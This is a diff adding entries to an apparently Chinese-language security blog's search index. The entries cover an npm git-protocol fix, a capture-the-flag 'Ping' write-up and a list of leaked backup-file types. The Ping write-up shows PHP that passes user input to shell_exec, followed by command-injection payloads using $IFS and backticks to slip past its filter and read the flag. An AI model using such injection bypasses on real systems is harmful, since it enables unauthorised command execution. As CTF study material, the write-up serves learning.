@@ -146,4 +146,61 @@
         <tag>2021红帽杯</tag>
       </tags>
   </entry>
+  <entry>
+    <title>moonsql</title>
+    <url>/2021/05/14/moonsql/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Giterror</title>
+    <url>/2022/04/16/Giterror/</url>
+    <content><![CDATA[<h2 id="fatal-remote-error-The-unauthenticated-git-protocol-on-port-9418-is-no-longer-supported"><a href="#fatal-remote-error-The-unauthenticated-git-protocol-on-port-9418-is-no-longer-supported" class="headerlink" title="fatal: remote error:   The unauthenticated git protocol on port 9418 is no longer supported."></a>fatal: remote error:   The unauthenticated git protocol on port 9418 is no longer supported.</h2><p>在npm中的报错，在package.json和package-lock.json中找到</p>
+<p>git://github.com/…</p>
+<p>更改为</p>
+<p>github:…</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Ping</title>
+    <url>/2021/05/16/Ping/</url>
+    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line"></span><br><span class="line">PING <span class="number">1</span> (<span class="number">0.0</span><span class="number">.0</span><span class="number">.1</span>): <span class="number">56</span> data bytes</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p> fxck your symbol</p>
+<p>&amp;/?*&lt;&gt;()[]{}</p>
+<p>fxck your space!</p>
+<p>空格</p>
+<p>bash</p>
+<p>flag的各种形式都拉黑了</p>
+<p>字符串拼接</p>
+<p>/?ip=1;d=g;cat$IFS$1fla$d.php</p>
+<p>内联执行</p>
+<p>把反引号内容的输出当输入</p>
+<p>/?ip=1;cat$IFS$1<code>ls</code></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>‘备份文件漏洞’</title>
+    <url>/2021/05/09/%E2%80%98%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E2%80%99/</url>
+    <content><![CDATA[<p>   常见的备份文件后缀名：</p>
+<p>git泄露</p>
+<p>.git </p>
+<p>.svn文件是subversion的版本控制信息文件 当某个目录处于subversion的版本控制时，在这个目录中就会.svn这个文件夹</p>
+<p>.svn </p>
+<p>非正常退出或多人同时编辑</p>
+<p>.swp </p>
+<p>默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件。</p>
+<p>.~</p>
+<p>.bash_history文件会让你 重用你 使用过的命令 （!+命令数字） </p>
+<p>（1）每个用户的主目录下都定义了一个.bash_history文件</p>
+<p> （2）许多发行版会记录用户前次输入的1000条命令</p>
+<p> （3）可以使用cat ~/.bash_history 来查看历史记录</p>
+<p> .bash_history</p>
+<p>开发人员手动备份文件</p>
+<p> .bak</p>
+<p>.old</p>
+<p>.temp</p>
+<p> 代码编辑器产生的备份文件</p>
+<p>.save</p>
+]]></content>
+  </entry>
 </search>
